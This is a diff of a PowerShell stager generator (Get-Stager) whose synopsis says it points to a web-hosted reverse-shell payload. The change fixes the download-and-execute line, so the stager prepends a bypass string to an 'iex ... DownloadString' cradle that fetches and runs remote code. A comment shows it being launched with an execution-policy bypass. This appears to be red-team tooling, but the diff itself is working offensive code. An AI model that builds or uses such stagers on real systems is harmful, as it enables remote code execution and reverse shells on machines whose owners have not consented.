@@ -1,7 +1,7 @@
 ﻿function Get-Stager {
 #.SYNOPSIS
 # Simple PowerShell stager generator to point to a web hosted RevShell payload. 
-# ARBITRARY VERSION NUMBER:  2.0.1
+# ARBITRARY VERSION NUMBER:  2.0.2
 # AUTHOR:  Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
@@ -85,7 +85,7 @@ Add-Type $Var1;
 
 
     # Final Payload
-    $Stager = $Bypass + "iex ((New-Object [System.Net.WebClient]).DownloadString('$PayloadURL'))"
+    $Stager = $Bypass + "iex ((New-Object System.Net.WebClient).DownloadString('$PayloadURL'))"
 
 
     # PowerShell -NoProfile -ExecutionPolicy Bypass -Command/EncodedCommand {Stager}
